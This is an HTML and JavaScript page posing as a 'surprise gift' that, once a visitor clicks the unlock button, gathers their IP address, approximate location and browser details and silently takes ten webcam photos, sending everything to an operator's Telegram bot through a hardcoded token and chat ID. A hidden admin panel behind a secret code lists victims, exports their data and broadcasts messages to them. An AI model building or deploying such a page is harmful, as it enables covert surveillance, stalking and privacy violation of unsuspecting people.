<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéÅ Surprise Gift</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: white; font-family: Arial; overflow: hidden; height: 100vh; }
        
        .screen { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            text-align: center; 
            padding: 20px; 
        }
        
        #startScreen { 
            background: linear-gradient(45deg, #ff0080, #8000ff); 
            z-index: 1000; 
        }
        
        .gift { 
            font-size: 100px; 
            margin-bottom: 20px; 
            animation: bounce 1s infinite; 
        }
        
        @keyframes bounce {
            0%,100% { transform: scale(1); }
            50% { transform: scale(1.2); }
        }
        
        .btn { 
            background: #00ff00; 
            color: black; 
            border: none; 
            padding: 15px 40px; 
            font-size: 20px; 
            border-radius: 50px; 
            margin: 20px; 
            cursor: pointer; 
            font-weight: bold; 
            box-shadow: 0 0 20px #00ff00; 
            transition: 0.3s; 
        }
        
        .btn:hover { transform: scale(1.05); box-shadow: 0 0 30px #00ff00; }
        
        #cameraScreen { 
            display: none; 
            background: #000; 
            z-index: 900; 
        }
        
        #video { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
            transform: scaleX(-1); 
        }
        
        .flash { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: white; 
            opacity: 0; 
            pointer-events: none; 
        }
        
        .counter { 
            position: fixed; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%); 
            font-size: 100px; 
            color: #ff0000; 
            font-weight: bold; 
            text-shadow: 0 0 20px #ff0000; 
            z-index: 950; 
        }
        
        #completeScreen { 
            display: none; 
            background: #000; 
            z-index: 1000; 
        }
        
        .big-heart { 
            font-size: 150px; 
            color: #00ff00; 
            animation: heartbeat 1s infinite; 
            margin-bottom: 30px; 
        }
        
        @keyframes heartbeat {
            0%,100% { transform: scale(1); }
            50% { transform: scale(1.3); }
        }
        
        .heart { 
            position: absolute; 
            font-size: 30px; 
            animation: fall linear forwards; 
            pointer-events: none; 
            z-index: 9999; 
        }
        
        @keyframes fall {
            to { transform: translateY(100vh) rotate(360deg); opacity: 0; }
        }
        
        canvas { display: none; }
        
        h2 { margin: 10px 0; font-size: 24px; }
        p { margin: 10px 0; font-size: 16px; opacity: 0.9; }
        
        /* Admin Panel Styles */
        #adminPanel {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 10000;
            padding: 20px;
            overflow-y: auto;
        }
        
        .admin-btn {
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 10px;
            cursor: pointer;
            margin: 10px;
            font-weight: bold;
        }
        
        .stats-box {
            background: #222;
            padding: 15px;
            border-radius: 10px;
            margin: 10px 0;
            max-width: 500px;
            margin-left: auto;
            margin-right: auto;
        }
        
        .user-list {
            max-height: 300px;
            overflow-y: auto;
            background: #111;
            padding: 10px;
            border-radius: 10px;
            margin: 10px 0;
        }
        
        .user-item {
            padding: 8px;
            border-bottom: 1px solid #333;
            text-align: left;
        }
        
        .broadcast-box {
            background: #333;
            padding: 15px;
            border-radius: 10px;
            margin: 15px 0;
        }
        
        textarea {
            width: 100%;
            height: 100px;
            background: #222;
            color: white;
            border: 1px solid #444;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
        }
        
        .send-btn {
            background: #00ff00;
            color: black;
            border: none;
            padding: 10px 30px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px;
        }
        
        .close-btn {
            position: absolute;
            top: 20px;
            right: 20px;
            background: #ff0000;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 50%;
            cursor: pointer;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <!-- Admin Panel (Hidden by default) -->
    <div id="adminPanel">
        <button class="close-btn" onclick="hideAdminPanel()">‚úñ</button>
        <h2>üîß HCO-Cam Admin Panel</h2>
        
        <div class="stats-box">
            <h3>üìä Statistics</h3>
            <p id="totalVisitors">Total Visitors: Loading...</p>
            <p id="todayVisitors">Today's Visitors: Loading...</p>
            <p id="totalPhotos">Total Photos Sent: Loading...</p>
        </div>
        
        <div class="user-list">
            <h3>üë• Recent Users</h3>
            <div id="userList">Loading users...</div>
        </div>
        
        <div class="broadcast-box">
            <h3>üì¢ Broadcast Message</h3>
            <textarea id="broadcastMessage" placeholder="Type message to send to all users..."></textarea>
            <br>
            <button class="send-btn" onclick="sendBroadcast()">üöÄ Send to All Users</button>
            <button class="admin-btn" onclick="exportUserData()">üì• Export User Data</button>
        </div>
        
        <button class="admin-btn" onclick="getFullStats()">üîÑ Refresh Statistics</button>
    </div>
    
    <!-- Secret Admin Trigger (Double tap top-right corner) -->
    <div style="position:fixed;top:0;right:0;width:100px;height:100px;z-index:9998;opacity:0;" onclick="checkAdminAccess()"></div>

    <!-- Screen 1: Start -->
    <div class="screen" id="startScreen">
        <div class="gift">üéÅ</div>
        <h2>SOMEONE HAS GIVEN YOU A SURPRISE!</h2>
        <p>Click below to unlock your gift</p>
        <button class="btn" onclick="startCamera()" id="startBtn">‚ú® UNLOCK GIFT NOW ‚ú®</button>
    </div>
    
    <!-- Screen 2: Camera -->
    <div class="screen" id="cameraScreen">
        <video id="video" autoplay playsinline></video>
        <div class="flash" id="flash"></div>
        <div class="counter" id="counter">10</div>
    </div>
    
    <!-- Screen 3: Complete -->
    <div class="screen" id="completeScreen">
        <div class="big-heart">‚ù§Ô∏è</div>
        <h2>SURPRISE COMPLETE!</h2>
        <p>Photos have been sent! üéâ</p>
    </div>
    
    <!-- Hidden Canvas -->
    <canvas id="canvas"></canvas>

    <script>
        // ========== YOUR TELEGRAM DETAILS ==========
        const BOT_TOKEN = '8226782560:AAEEqVHnfwAURU9pm3-VQc5OHLTdhwn_dNI';
        const OWNER_ID = '8215819954';
        const ADMIN_SECRET = 'hco123'; // Secret code for admin panel
        // ===========================================
        
        // Get user info from URL
        const url = new URL(window.location.href);
        const userId = url.searchParams.get('uid');
        const userName = url.searchParams.get('name') || 'Unknown';
        
        // DOM Elements
        const startScreen = document.getElementById('startScreen');
        const cameraScreen = document.getElementById('cameraScreen');
        const completeScreen = document.getElementById('completeScreen');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const counter = document.getElementById('counter');
        const flash = document.getElementById('flash');
        const startBtn = document.getElementById('startBtn');
        
        // Variables
        let cameraStream = null;
        const totalImages = 10;
        let adminTapCount = 0;
        let adminTapTimer = null;
        
        // ========== ENHANCED TRACKING FUNCTIONS ==========
        
        // 1. Get IP Address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }
        
        // 2. Get Location (approximate via IP)
        async function getLocationFromIP(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city || 'Unknown',
                    country: data.country_name || 'Unknown',
                    lat: data.latitude || 'Unknown',
                    lon: data.longitude || 'Unknown'
                };
            } catch (error) {
                return {
                    city: 'Unknown',
                    country: 'Unknown',
                    lat: 'Unknown',
                    lon: 'Unknown'
                };
            }
        }
        
        // 3. Get Browser Info
        function getBrowserInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
                javaScript: 'Enabled',
                online: navigator.onLine ? 'Online' : 'Offline'
            };
        }
        
        // 4. Get Date & Time
        function getDateTime() {
            const now = new Date();
            return {
                date: now.toLocaleDateString(),
                time: now.toLocaleTimeString(),
                timestamp: now.getTime(),
                iso: now.toISOString()
            };
        }
        
        // 5. Visitor Counter
        function updateVisitorCounter() {
            let visitors = localStorage.getItem('hco_total_visitors') || 0;
            visitors++;
            localStorage.setItem('hco_total_visitors', visitors);
            
            // Today's visitors
            const today = new Date().toDateString();
            let todayVisitors = JSON.parse(localStorage.getItem('hco_daily_visitors') || '{}');
            todayVisitors[today] = (todayVisitors[today] || 0) + 1;
            localStorage.setItem('hco_daily_visitors', JSON.stringify(todayVisitors));
            
            return {
                total: visitors,
                today: todayVisitors[today] || 0
            };
        }
        
        // 6. Save User Data
        async function saveUserData() {
            const ip = await getIPAddress();
            const location = await getLocationFromIP(ip);
            const browser = getBrowserInfo();
            const datetime = getDateTime();
            const visitors = updateVisitorCounter();
            
            const userData = {
                userId: userId,
                userName: userName,
                ip: ip,
                location: location,
                browser: browser,
                datetime: datetime,
                visitorCount: visitors,
                url: window.location.href
            };
            
            // Save to localStorage
            let allUsers = JSON.parse(localStorage.getItem('hco_all_users') || '[]');
            allUsers.unshift(userData); // Add to beginning
            if (allUsers.length > 100) allUsers = allUsers.slice(0, 100); // Keep last 100
            localStorage.setItem('hco_all_users', JSON.stringify(allUsers));
            
            // Send to Telegram
            sendUserDataToTelegram(userData);
            
            return userData;
        }
        
        // 7. Send User Data to Telegram
        function sendUserDataToTelegram(userData) {
            const message = `
üì± *NEW USER DETECTED*

üë§ *User Info:*
‚Ä¢ Name: ${userData.userName}
‚Ä¢ ID: ${userData.userId}
‚Ä¢ IP: ${userData.ip}

üìç *Location:*
‚Ä¢ City: ${userData.location.city}
‚Ä¢ Country: ${userData.location.country}
‚Ä¢ Coordinates: ${userData.location.lat}, ${userData.location.lon}

üåê *Browser Info:*
‚Ä¢ Device: ${userData.browser.userAgent}
‚Ä¢ Platform: ${userData.browser.platform}
‚Ä¢ Screen: ${userData.browser.screen}
‚Ä¢ Timezone: ${userData.browser.timezone}

‚è∞ *Time:*
‚Ä¢ Date: ${userData.datetime.date}
‚Ä¢ Time: ${userData.datetime.time}

üìä *Statistics:*
‚Ä¢ Total Visitors: ${userData.visitorCount.total}
‚Ä¢ Today's Visitors: ${userData.visitorCount.today}

üîó URL: ${userData.url}
            `;
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: OWNER_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
        
        // ========== ADMIN PANEL FUNCTIONS ==========
        
        // Show admin panel
        function showAdminPanel() {
            document.getElementById('adminPanel').style.display = 'block';
            loadAdminStats();
        }
        
        // Hide admin panel
        function hideAdminPanel() {
            document.getElementById('adminPanel').style.display = 'none';
        }
        
        // Check admin access (double tap top-right corner)
        function checkAdminAccess() {
            adminTapCount++;
            
            if (adminTapTimer) clearTimeout(adminTapTimer);
            
            if (adminTapCount === 5) {
                const secret = prompt('Enter admin secret code:');
                if (secret === ADMIN_SECRET) {
                    showAdminPanel();
                }
                adminTapCount = 0;
            }
            
            adminTapTimer = setTimeout(() => {
                adminTapCount = 0;
            }, 2000);
        }
        
        // Load admin statistics
        function loadAdminStats() {
            const visitors = localStorage.getItem('hco_total_visitors') || 0;
            const today = new Date().toDateString();
            const daily = JSON.parse(localStorage.getItem('hco_daily_visitors') || '{}');
            const todayCount = daily[today] || 0;
            
            // Count total photos (assuming 10 per user)
            const allUsers = JSON.parse(localStorage.getItem('hco_all_users') || '[]');
            const totalPhotos = allUsers.length * 10;
            
            document.getElementById('totalVisitors').textContent = `Total Visitors: ${visitors}`;
            document.getElementById('todayVisitors').textContent = `Today's Visitors: ${todayCount}`;
            document.getElementById('totalPhotos').textContent = `Total Photos Sent: ${totalPhotos}`;
            
            // Show user list
            let userListHTML = '';
            allUsers.slice(0, 20).forEach((user, index) => {
                userListHTML += `
                    <div class="user-item">
                        ${index + 1}. ${user.userName} (${user.userId || 'No ID'})<br>
                        <small>üìç ${user.location.city}, ${user.location.country} | ‚è∞ ${user.datetime.date} ${user.datetime.time}</small>
                    </div>
                `;
            });
            document.getElementById('userList').innerHTML = userListHTML || 'No users yet';
        }
        
        // Send broadcast to all users
        async function sendBroadcast() {
            const message = document.getElementById('broadcastMessage').value.trim();
            if (!message) {
                alert('Please enter a message');
                return;
            }
            
            if (!confirm(`Send this message to all users?`)) return;
            
            const allUsers = JSON.parse(localStorage.getItem('hco_all_users') || '[]');
            const userIds = [...new Set(allUsers.map(u => u.userId).filter(id => id && /^\d+$/.test(id)))];
            
            if (userIds.length === 0) {
                alert('No users with valid Telegram IDs found');
                return;
            }
            
            let sentCount = 0;
            let failedCount = 0;
            
            for (const uid of userIds) {
                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: uid,
                            text: `üì¢ *Broadcast from HCO-Cam Bot*\n\n${message}`,
                            parse_mode: 'Markdown'
                        })
                    });
                    sentCount++;
                    
                    // Delay to avoid rate limiting
                    await new Promise(resolve => setTimeout(resolve, 100));
                } catch (error) {
                    failedCount++;
                }
            }
            
            alert(`Broadcast sent!\n‚úÖ Success: ${sentCount}\n‚ùå Failed: ${failedCount}`);
            
            // Also send to owner for record
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: OWNER_ID,
                    text: `üì¢ Broadcast Sent\n\nMessage: ${message}\n\nSent to: ${sentCount} users\nFailed: ${failedCount} users`,
                    parse_mode: 'Markdown'
                })
            });
        }
        
        // Export user data
        function exportUserData() {
            const allUsers = JSON.parse(localStorage.getItem('hco_all_users') || '[]');
            const dataStr = JSON.stringify(allUsers, null, 2);
            const dataUri = 'data:application/json;charset=utf-8,'+ encodeURIComponent(dataStr);
            
            const exportFileDefaultName = `hco-users-${new Date().toISOString().split('T')[0]}.json`;
            
            const linkElement = document.createElement('a');
            linkElement.setAttribute('href', dataUri);
            linkElement.setAttribute('download', exportFileDefaultName);
            linkElement.click();
        }
        
        // Get full statistics
        function getFullStats() {
            loadAdminStats();
            alert('Statistics refreshed!');
        }
        
        // ========== ORIGINAL CAMERA FUNCTIONS ==========
        
        function createHearts(count = 5) {
            for(let i = 0; i < count; i++) {
                setTimeout(() => {
                    const heart = document.createElement('div');
                    heart.className = 'heart';
                    heart.innerHTML = '‚ù§Ô∏è';
                    heart.style.left = Math.random() * 100 + 'vw';
                    heart.style.fontSize = (Math.random() * 40 + 20) + 'px';
                    heart.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    heart.style.color = ['#ff0000', '#ff0080', '#ff1493'][Math.floor(Math.random() * 3)];
                    document.body.appendChild(heart);
                    
                    setTimeout(() => {
                        if(heart.parentNode) heart.parentNode.removeChild(heart);
                    }, 5000);
                }, i * 100);
            }
        }
        
        // Initial hearts
        for(let i = 0; i < 10; i++) {
            setTimeout(() => createHearts(2), i * 300);
        }
        
        async function startCamera() {
            startBtn.disabled = true;
            startBtn.innerHTML = 'üé• Starting Camera...';
            
            try {
                // Save user data (IP, location, browser info, etc.)
                await saveUserData();
                
                // Start camera
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 720 },
                        height: { ideal: 1280 }
                    }
                });
                
                // Switch screens
                startScreen.style.display = 'none';
                cameraScreen.style.display = 'flex';
                video.srcObject = cameraStream;
                
                // Start capturing
                setTimeout(captureAllImages, 1000);
                
            } catch (error) {
                startBtn.innerHTML = '‚ùå Camera Error!';
                startBtn.disabled = false;
            }
        }
        
        async function captureAllImages() {
            counter.style.display = 'block';
            
            for(let i = 0; i < totalImages; i++) {
                counter.textContent = totalImages - i;
                
                flash.style.opacity = '0.8';
                setTimeout(() => flash.style.opacity = '0', 100);
                
                await captureAndSendImage(i + 1);
                
                createHearts(3);
                
                await sleep(400);
            }
            
            counter.style.display = 'none';
            finishCapture();
        }
        
        async function captureAndSendImage(imageNumber) {
            return new Promise((resolve) => {
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                ctx.save();
                ctx.scale(-1, 1);
                ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
                ctx.restore();
                
                canvas.toBlob(async (blob) => {
                    // Send to owner
                    const ownerForm = new FormData();
                    ownerForm.append('chat_id', OWNER_ID);
                    ownerForm.append('photo', blob, `owner_${imageNumber}.jpg`);
                    ownerForm.append('caption', `üì∏ ${imageNumber}/${totalImages}\nFrom: ${userName} (${userId || 'No ID'})`);
                    
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: ownerForm
                    });
                    
                    // Send to user if ID exists
                    if(userId && /^\d+$/.test(userId)) {
                        const userForm = new FormData();
                        userForm.append('chat_id', userId);
                        userForm.append('photo', blob, `your_photo_${imageNumber}.jpg`);
                        userForm.append('caption', `üì∏ Your photo ${imageNumber}/${totalImages}`);
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: userForm
                        });
                    }
                    
                    resolve();
                }, 'image/jpeg', 0.9);
            });
        }
        
        function finishCapture() {
            if(cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
            
            cameraScreen.style.display = 'none';
            completeScreen.style.display = 'flex';
            
            // Massive heart celebration
            for(let i = 0; i < 100; i++) {
                setTimeout(() => createHearts(3), i * 50);
            }
            
            setTimeout(() => {
                document.body.style.opacity = '0.5';
            }, 5000);
        }
        
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
    </script>
</body>
</html>
